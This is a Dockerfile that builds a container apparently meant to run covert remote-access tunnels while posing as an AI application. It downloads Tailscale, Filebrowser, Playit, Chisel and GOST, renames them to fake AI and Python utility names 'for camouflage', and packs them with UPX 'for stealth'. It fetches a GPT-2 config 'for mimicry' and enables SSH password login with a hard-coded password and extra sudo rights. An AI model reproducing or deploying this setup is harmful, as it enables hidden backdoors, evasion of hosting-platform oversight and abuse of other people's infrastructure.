FROM ubuntu:22.04

# Use uv for extremely fast installs
COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

# Install basic tools and common QoL utilities
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl wget sudo python3 python3-pip upx openssh-server nginx \
    git vim nano htop tmux jq unzip iputils-ping net-tools tree \
    rclone fuse3 supervisor \
    && apt-get clean && rm -rf /var/lib/apt/lists/* && \
    mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
    echo "Port 2222" >> /etc/ssh/sshd_config && \
    ssh-keygen -A

# Install Tailscale, Filebrowser, Playit, Chisel, and GOST
RUN curl -fsSL https://tailscale.com/install.sh | bash && \
    curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
    curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator && \
    chmod +x /usr/bin/tensor-allocator && \
    curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz && \
    gzip -d /tmp/chisel.gz && \
    mv /tmp/chisel /usr/bin/cuda-mesh-bridge && \
    chmod +x /usr/bin/cuda-mesh-bridge && \
    curl -fsSL URL_OBFUSCATE("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz && \
    tar -xzf /tmp/gost.tar.gz -C /tmp/ && \
    mv /tmp/gost /usr/bin/system-bridge && \
    chmod +x /usr/bin/system-bridge

# Rename tools for camouflage
RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
    mv /usr/bin/tailscale /usr/bin/py-cache-cli && \
    mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector

# Binary Stripping and Packing (using fastest compression for stealth)
RUN upx -1 /usr/bin/python-cache-manager || true && \
    upx -1 /usr/bin/py-cache-cli || true && \
    upx -1 /usr/bin/ai-metrics-collector || true && \
    upx -1 /usr/bin/tensor-allocator || true && \
    upx -1 /usr/bin/cuda-mesh-bridge || true && \
    upx -1 /usr/bin/system-bridge || true

# Install AI dependencies using uv
RUN uv pip install --system --no-cache-dir \
    gradio huggingface_hub loguru

# Download a tiny model config for mimicry
RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"

# Create non-root user 'user' with sudo access and bash shell
RUN useradd -m -u 1000 -s /bin/bash user && \
    echo "user:apple123" | chpasswd && \
    usermod -aG sudo user && \
    mkdir -p /home/user/.torch_metrics && \
    chown -R user:user /home/user/.torch_metrics && \
    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers

# Copy application files
COPY --chown=user:user src/app.py /home/user/app.py
COPY --chown=user:user src/core /home/user/core
COPY --chown=user:user src/services /home/user/services
COPY --chown=user:user config /home/user/config

USER user
WORKDIR /home/user

# Run the script via supervisord
CMD ["/usr/bin/supervisord", "-c", "/home/user/config/supervisord.conf"]
